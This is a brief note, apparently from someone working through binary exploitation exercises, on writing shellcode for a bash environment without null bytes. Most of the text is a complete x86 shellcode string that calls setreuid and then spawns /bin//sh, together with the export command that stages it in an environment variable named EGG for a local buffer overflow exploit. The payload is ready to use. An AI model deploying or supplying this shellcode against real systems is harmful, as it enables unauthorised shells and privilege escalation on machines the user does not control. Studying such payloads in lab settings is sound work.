Shellcode insertion to bash should not coontain \x00 bytes as shell can not handle it. Try using:
xor eax, eax
mov al <8bit val>
or
mov ax <16 bit val>

This way we won't have 00 bytes in the code.

Use python2 to insert the shellcode to an ENV var:

export EGG=`python2 -c 'print "\x31\xc0\xb0\x46\x31\xdb\x66\xbb\xe9\x03\x66\x31\xc9\x66\xb9\xe9\x03\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"'`
